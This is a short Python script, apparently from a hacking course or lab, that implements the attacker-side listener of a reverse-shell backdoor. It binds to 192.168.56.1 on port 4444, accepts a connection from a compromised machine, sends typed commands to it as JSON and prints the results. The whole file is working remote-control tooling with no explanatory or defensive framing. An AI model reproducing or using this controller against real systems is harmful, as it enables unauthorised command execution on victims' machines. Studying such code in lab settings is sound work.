#!/usr/bin/python

import socket, json

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen()
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Connection accepted from " + str(address))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        print(json_data)
        self.connection.sendall(json_data.encode('utf8'))

    def reliable_revice(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf8'))
            except ValueError:
                continue

    def execute(self, cmd):
        self.reliable_send(cmd)
        if cmd[0] == "exit":
            print("[+] Colse connection and quit ")
            self.connection.close()
            exit()
        return self.reliable_revice()

    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            print(command)
            result = self.execute(command)
            print(result)



my_listener = Listener("192.168.56.1", 4444)
my_listener.run()





